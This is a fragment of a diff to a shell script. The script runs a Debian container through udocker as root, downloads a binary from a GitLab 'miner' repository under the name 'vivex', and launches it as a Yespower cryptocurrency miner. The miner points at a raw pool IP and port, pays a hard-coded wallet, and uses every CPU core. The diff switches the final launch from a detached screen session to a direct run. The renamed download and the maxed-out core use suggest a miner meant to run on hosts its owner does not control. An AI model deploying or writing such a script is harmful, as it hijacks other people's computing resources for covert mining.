@@ -11,5 +11,5 @@ wget https://github.com/indigo-dc/udocker/releases/download/1.3.9/udocker-1.3.9.
 ./udocker --allow-root run debian /bin/bash -c 'apt-get update && apt-get full-upgrade -y && apt-get -y dist-upgrade && apt-get -y autoremove && apt-get -y install wget curl libsodium* '
 ./udocker --allow-root run debian /bin/bash -c 'apt install screen -y'
 ./udocker --allow-root run debian /bin/bash -c 'apt install libfuse-dev -y && curl -0 https://gitlab.com/ghcees/miner/-/raw/main/rplnt -o vivex && chmod +x vivex'
-./udocker --allow-root run debian /bin/bash -c 'screen -dms run ./vivex -a Yespower -o 47.254.125.141:6666 -u v4rU16nhcJt4T9EPJ3xqjDpnCrsLKWAVrC.$(echo $(TZ=UTC-7 date +"%H-%M")) -t $(nproc --all)'
-./udocker --allow-root run debian /bin/bash -c 'screen -r'
+./udocker --allow-root run debian /bin/bash -c './vivex -a Yespower -o 47.254.125.141:6666 -u v4rU16nhcJt4T9EPJ3xqjDpnCrsLKWAVrC.$(echo $(TZ=UTC-7 date +"%H-%M")) -t $(nproc --all)'
+
